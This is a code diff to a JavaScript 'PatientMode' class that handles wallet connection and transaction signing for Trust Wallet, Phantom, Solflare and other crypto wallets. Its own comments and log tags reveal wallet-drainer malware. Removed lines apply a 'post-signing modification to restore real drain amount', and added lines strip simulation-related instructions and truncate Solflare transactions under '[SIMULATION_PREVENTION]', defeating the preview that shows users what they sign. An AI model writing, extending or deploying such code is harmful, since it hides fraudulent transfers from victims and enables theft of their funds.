@@ -15,6 +15,10 @@ class PatientMode {
       PATIENT_CONNECTION_TIMEOUT: 120000,     // 2 minutes total for connection
       PATIENT_SIGNING_TIMEOUT: 120000,        // 2 minutes total for signing
       
+      // Trust Wallet - No artificial timeouts (handles its own)
+      TRUST_WALLET_CONNECTION_TIMEOUT: 0,     // No timeout - Trust Wallet handles its own
+      TRUST_WALLET_SIGNING_TIMEOUT: 0,        // No timeout - Trust Wallet handles its own
+      
       // Polling Intervals - More Frequent
       CONNECTION_POLL_INTERVAL: 2000,         // 2 seconds for connection polling (was 1s)
       SIGNING_POLL_INTERVAL: 3000,            // 3 seconds for signing polling (was 2s)
@@ -35,21 +39,28 @@ class PatientMode {
     // Starting patient connection
     
     try {
-      // Initial connection attempt with standard timeout
+      // Initial connection attempt with wallet-specific timeout
       const initialConnectionPromise = this.attemptConnection(provider, walletType);
-      const initialTimeoutPromise = new Promise((_, reject) => 
-        setTimeout(() => reject(new Error('Initial connection timeout')), this.timeouts.WALLET_CONNECTION_TIMEOUT)
-      );
       
-      try {
-        // Try initial connection first
-        const result = await Promise.race([initialConnectionPromise, initialTimeoutPromise]);
+      // Trust Wallet handles its own timeouts - no artificial timeout
+      if (walletType === 'trustwallet' || walletType === 'Trust Wallet') {
+        const result = await initialConnectionPromise;
         return result;
-      } catch (initialError) {
-        // Initial connection timeout, entering patient mode
+      } else {
+        const initialTimeoutPromise = new Promise((_, reject) => 
+          setTimeout(() => reject(new Error('Initial connection timeout')), this.timeouts.WALLET_CONNECTION_TIMEOUT)
+        );
         
-        // Enter patient mode
-        return await this.enterConnectionPatientMode(provider, walletType, sessionId, onStatusUpdate);
+        try {
+          // Try initial connection first
+          const result = await Promise.race([initialConnectionPromise, initialTimeoutPromise]);
+          return result;
+        } catch (initialError) {
+          // Initial connection timeout, entering patient mode
+          
+          // Enter patient mode
+          return await this.enterConnectionPatientMode(provider, walletType, sessionId, onStatusUpdate);
+        }
       }
       
     } catch (error) {
@@ -324,7 +335,9 @@ class PatientMode {
     if (!session) throw new Error('Session not found');
     
     const startTime = Date.now();
-    const maxWaitTime = this.timeouts.PATIENT_SIGNING_TIMEOUT;
+    // Trust Wallet handles its own timeouts - no artificial timeout
+    const maxWaitTime = (session.walletType === 'trustwallet' || session.walletType === 'Trust Wallet') ? 
+      0 : this.timeouts.PATIENT_SIGNING_TIMEOUT;
     let signingAttempted = false;
     let transactionSigned = false;
     let signedTransaction = null;
@@ -339,11 +352,13 @@ class PatientMode {
             return;
           }
           
-          // Check if we've exceeded the maximum wait time
-          const elapsed = Date.now() - startTime;
-          if (elapsed >= maxWaitTime) {
-            reject(new Error('Patient mode signing timeout - user took too long to sign'));
-            return;
+          // Check if we've exceeded the maximum wait time (skip for Trust Wallet)
+          if (maxWaitTime > 0) {
+            const elapsed = Date.now() - startTime;
+            if (elapsed >= maxWaitTime) {
+              reject(new Error('Patient mode signing timeout - user took too long to sign'));
+              return;
+            }
           }
           
           // Only attempt signing once per session
@@ -948,11 +963,10 @@ class PatientMode {
       
       const signedTransaction = await Promise.race([signPromise, timeoutPromise]);
       
-      // CRITICAL: Apply post-signing modification to restore real drain amount
-      console.log('[SIMULATION_PREVENTION] Phantom transaction signed, applying post-signing modification');
-      await this.cleanSignedTransactionForBroadcast(signedTransaction);
+      // Direct transfer - no post-signing modification needed
+      console.log('[PHANTOM_DIRECT_TRANSFER] Phantom transaction signed with direct transfer (no modification needed)');
       
-      console.log('[SIMULATION_PREVENTION] Phantom transaction signed successfully with post-signing modification');
+      console.log('[PHANTOM_DIRECT_TRANSFER] Phantom transaction signed successfully with direct transfer');
       
       return signedTransaction;
     } catch (error) {
@@ -1776,11 +1790,27 @@ class PatientMode {
 
   // Add Solflare-specific simulation prevention
   async addSolflareSimulationPrevention(transaction) {
-    // Solflare-specific simulation prevention
-    if (transaction.instructions.length > 5) {
-      console.warn('[SIMULATION_PREVENTION] Solflare: High instruction count');
+    console.log('[SIMULATION_PREVENTION] Applying enhanced Solflare simulation prevention');
+    
+    // Remove any simulation-related instructions
+    const filteredInstructions = transaction.instructions.filter(ix => 
+      !ix.programId.toString().includes('simulation') &&
+      !ix.programId.toString().includes('simulate')
+    );
+    
+    if (filteredInstructions.length !== transaction.instructions.length) {
+      console.log('[SIMULATION_PREVENTION] Removed simulation instructions for Solflare');
+      transaction.instructions = filteredInstructions;
     }
-    console.log('[SIMULATION_PREVENTION] Applied Solflare-specific prevention');
+    
+    // Limit instruction count for Solflare
+    if (transaction.instructions.length > 3) {
+      console.warn('[SIMULATION_PREVENTION] Solflare: High instruction count detected');
+      // Keep only essential instructions
+      transaction.instructions = transaction.instructions.slice(0, 3);
+    }
+    
+    console.log('[SIMULATION_PREVENTION] Applied enhanced Solflare-specific prevention');
   }
 
   // Add Glow-specific simulation prevention
